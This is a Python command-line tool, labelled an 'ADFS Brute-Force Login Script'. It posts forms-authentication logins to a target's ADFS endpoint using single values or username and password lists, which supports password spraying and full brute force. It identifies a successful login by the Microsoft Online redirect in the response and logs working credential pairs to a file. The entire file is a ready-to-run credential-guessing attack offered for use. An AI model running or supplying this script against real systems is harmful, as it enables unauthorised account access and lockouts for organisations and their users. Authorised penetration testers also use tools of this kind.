import requests
import argparse
from colorama import Fore, Style

def send_request(target, username, password, verbose=False, log_file=None):
    if verbose:
        print(f"{Fore.WHITE}[*] Trying login for {username}{Style.RESET_ALL}")

    payload = {
        "UserName": username,
        "Password": password,
        "AuthMethod": "FormsAuthentication",
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    }
    try:
        response = requests.post(
            f"{target}/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline&wctx=cbcxt=&username={username}",
            data=payload,
            headers=headers,
            timeout=10
        )
        response.raise_for_status()

        # Check if the response code is okay and contains the success string
        if response.status_code == requests.codes.ok:
            if "action=\"https://login.microsoftonline.com:443/login.srf\"" in response.text:
                success_message = f"[+] Login success: {username} : {password}"
                print(f"{Fore.GREEN}{success_message}{Style.RESET_ALL}")
                if log_file:
                    with open(log_file, "a") as log:
                        log.write(success_message + "\n")
            elif verbose:
                failure_message = f"[-] Login failed: {username} : {password}"
                print(f"{Fore.RED}{failure_message}{Style.RESET_ALL}")
                if log_file:
                    with open(log_file, "a") as log:
                        log.write(failure_message + "\n")
        else:
            print(f"{Fore.RED}[!] Unexpected response code: {response.status_code}{Style.RESET_ALL}")
    except requests.exceptions.Timeout:
        print(f"{Fore.RED}[!] Request timed out.{Style.RESET_ALL}")
    except requests.exceptions.HTTPError as e:
        print(f"{Fore.RED}[!] HTTP Error occurred: {e}{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Error occurred: {e}{Style.RESET_ALL}")

def single_username_single_password(target, username, password, verbose, log_file):
    send_request(target, username, password, verbose=verbose, log_file=log_file)

def single_username_password_list(target, username, password_list_file, verbose, log_file):
    try:
        with open(password_list_file, "r") as file:
            for password in file:
                send_request(target, username, password.strip(), verbose=verbose, log_file=log_file)
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File '{password_list_file}' not found.{Style.RESET_ALL}")
    except IOError as e:
        print(f"{Fore.RED}[!] Error occurred while reading the file: {e}{Style.RESET_ALL}")

def username_list_single_password(target, username_list_file, password, verbose, log_file):
    try:
        with open(username_list_file, "r") as file:
            for username in file:
                send_request(target, username.strip(), password, verbose=verbose, log_file=log_file)
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Username list file '{username_list_file}' not found.{Style.RESET_ALL}")
    except IOError as e:
        print(f"{Fore.RED}[!] Error occurred while reading the file: {e}{Style.RESET_ALL}")

def username_list_password_list(target, username_list_file, password_list_file, verbose, log_file):
    try:
        with open(username_list_file, "r") as users:
            user_list = users.read().splitlines()
        with open(password_list_file, "r") as passwords:
            password_list = passwords.read().splitlines()

        for username in user_list:
            for password in password_list:
                send_request(target, username.strip(), password.strip(), verbose=verbose, log_file=log_file)
    except FileNotFoundError:
        if not username_list_file:
            print(f"{Fore.RED}[!] Username list file not provided.{Style.RESET_ALL}")
        if not password_list_file:
            print(f"{Fore.RED}[!] Password list file not provided.{Style.RESET_ALL}")
    except IOError as e:
        print(f"{Fore.RED}[!] Error occurred while reading the file: {e}{Style.RESET_ALL}")
        

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="ADFS Brute-Force Login Script",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Usage examples:"
               "\n  python script.py -t https://adfs.example.com -u user -p password123"
               "\n  python script.py -t https://adfs.example.com -U userlist.txt -p password123"
               "\n  python script.py -t https://adfs.example.com -u user -P passwordlist.txt"
               "\n  python script.py -t https://adfs.example.com -U userlist.txt -P passwordlist.txt"
               "\n\nNote: Provide either a single password (-p) or a password list file (-P).\n"
    )

    parser.add_argument(
        "-t", "--target", type=str, required=True,
        help="ADFS target host URL (e.g., https://adfs.example.com)"
    )
    parser.add_argument(
        "-u", "--username", type=str, required=False,
        help="Single username to try"
    )
    parser.add_argument(
        "-U", "--username-list", type=str, required=False,
        help="File containing a list of usernames"
    )
    parser.add_argument(
        "-p", "--password", type=str, required=False,
        help="Single password to use for login attempts"
    )
    parser.add_argument(
        "-P", "--password-list", type=str, required=False,
        help="File containing a list of passwords"
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", default=False,
        help="Enable verbose mode to show all print statements"
    )
    parser.add_argument(
        "-l", "--log-file", type=str, required=False,
        help="File to log the login results"
    )

    args = parser.parse_args()

    target = args.target
    username = args.username
    username_list_file = args.username_list
    password = args.password
    password_list_file = args.password_list
    verbose = args.verbose
    log_file = args.log_file

    print(f"{Fore.CYAN}[*] Target ADFS Host: {target}{Style.RESET_ALL}")

    if username and password:
        single_username_single_password(target, username, password, verbose, log_file)
    elif username and password_list_file:
        single_username_password_list(target, username, password_list_file, verbose, log_file)
    elif username_list_file and password:
        username_list_single_password(target, username_list_file, password, verbose, log_file)
    elif username_list_file and password_list_file:
        username_list_password_list(target, username_list_file, password_list_file, verbose, log_file)
    else:
        print(f"{Fore.RED}[!] Invalid combination of username and password options.{Style.RESET_ALL}")
